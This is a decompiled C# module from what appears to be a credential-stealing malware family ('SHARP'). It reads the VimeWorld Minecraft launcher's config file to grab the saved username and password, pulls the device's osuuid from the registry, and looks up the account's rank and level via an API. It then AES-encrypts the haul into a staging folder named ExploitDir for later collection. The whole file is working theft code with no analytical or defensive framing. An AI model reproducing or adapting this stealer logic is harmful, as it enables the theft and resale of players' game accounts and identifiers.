﻿using System;
using System.IO;
using System.Net;
using System.Text;
using Microsoft.Win32;

namespace SHARP
{
	// Token: 0x02000060 RID: 96
	internal class Vime
	{
		// Token: 0x06000216 RID: 534 RVA: 0x0000CF5C File Offset: 0x0000B15C
		public static void Get()
		{
			try
			{
				string exploitDir = Help.ExploitDir;
				if (File.Exists(Vime.patchConfig))
				{
					string text;
					using (StreamReader streamReader = new StreamReader(Vime.patchConfig))
					{
						text = streamReader.ReadToEnd();
					}
					if (text.Contains("password"))
					{
						string text2 = exploitDir + "\\VimeWorld";
						Directory.CreateDirectory(text2);
						if (Config.VimeWorld)
						{
							Vime.InfoPlayer = new WebClient().DownloadString(Help.VimeAPI + Vime.NickName());
						}
						string path = Path.Combine(text2, (Config.VimeWorld ? (Vime.Donate() + Vime.Level()) : "") + Vime.NickName());
						text = text + "||||" + Vime.OSSUID();
						text = AES.EncryptStringAES(text, Config.key);
						using (StreamWriter streamWriter = new StreamWriter(path))
						{
							streamWriter.WriteLine(text);
						}
						Counting.VimeWorld++;
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(((ex != null) ? ex.ToString() : null) + "Ошибка с Vime.Get");
			}
		}

		// Token: 0x06000217 RID: 535 RVA: 0x0000D09C File Offset: 0x0000B29C
		public static string Level()
		{
			string infoPlayer = Vime.InfoPlayer;
			int num = infoPlayer.IndexOf("\"level\":");
			string text = infoPlayer.Substring(num + 8);
			num = text.IndexOf(",");
			string str = text.Substring(0, num);
			return "[" + str + "]";
		}

		// Token: 0x06000218 RID: 536 RVA: 0x0000D0E8 File Offset: 0x0000B2E8
		public static string Donate()
		{
			string infoPlayer = Vime.InfoPlayer;
			int num = infoPlayer.IndexOf("\"rank\":");
			string text = infoPlayer.Substring(num + 8);
			num = text.IndexOf("\"");
			string str = text.Substring(0, num);
			return "[" + str + "]";
		}

		// Token: 0x06000219 RID: 537 RVA: 0x0000D134 File Offset: 0x0000B334
		public static string OSSUID()
		{
			string result;
			try
			{
				result = (Registry.CurrentUser.OpenSubKey("Software\\VimeWorld").GetValue("osuuid") as string);
			}
			catch (Exception ex)
			{
				Console.WriteLine(((ex != null) ? ex.ToString() : null) + "Ошибка с OSSUID");
				result = "Error";
			}
			return result;
		}

		// Token: 0x0600021A RID: 538 RVA: 0x0000D198 File Offset: 0x0000B398
		public static string NickName()
		{
			string result;
			try
			{
				string text = "Error";
				StreamReader streamReader = new StreamReader(Vime.patchConfig, Encoding.Default);
				while (!streamReader.EndOfStream)
				{
					text = streamReader.ReadLine();
					if (text.StartsWith("username:"))
					{
						text = text.Substring(text.IndexOf(':') + 1);
						break;
					}
				}
				result = text;
			}
			catch (Exception ex)
			{
				Console.WriteLine(((ex != null) ? ex.ToString() : null) + "ошибка NickName");
				result = "Error";
			}
			return result;
		}

		// Token: 0x04000120 RID: 288
		public static string patchConfig = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.vimeworld", "config");

		// Token: 0x04000121 RID: 289
		public static string InfoPlayer;
	}
}
